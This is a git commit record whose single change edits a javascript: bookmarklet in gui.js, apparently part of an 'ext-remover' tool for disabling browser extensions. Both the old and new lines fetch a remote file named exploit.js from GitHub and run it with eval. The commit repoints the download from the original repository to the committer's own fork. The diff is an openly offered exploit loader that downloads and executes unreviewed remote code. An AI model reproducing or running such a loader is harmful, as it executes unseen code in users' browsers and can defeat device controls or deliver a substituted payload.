5c4ae7ffb401e38306fb1f62d1980ca409a4d798
Neealdon3 <138321129+neealdon3@users.noreply.github.com>
2023-09-08 16:40:52 -0700

    Update gui.js

--- gui.js
+++ gui.js
@@ -1,1 +1,1 @@
-javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
+javascript:void fetch(`https://raw.githubusercontent.com/neealdon3/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
